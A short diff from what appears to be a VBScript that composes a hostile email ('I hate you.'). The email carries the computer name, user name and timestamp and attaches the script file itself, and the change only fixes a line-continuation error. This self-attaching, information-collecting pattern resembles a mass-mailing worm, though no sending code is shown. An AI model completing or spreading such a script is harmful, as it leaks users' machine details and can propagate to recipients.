@@ -61,7 +61,7 @@ EMAIL_BODY = "I hate you." & vbCrLf & _
              "System: " & objWshShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
              "User: " & objWshShell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
              "Timestamp: " & Now() & vbCrLf & vbCrLf & _
-             "If you do not understand it check the .vbs for information." & vbCrLf & _
+             "If you do not understand it check the .vbs for information." & vbCrLf
 
 Dim ATTACHMENT_PATH
 ATTACHMENT_PATH = WScript.ScriptFullName
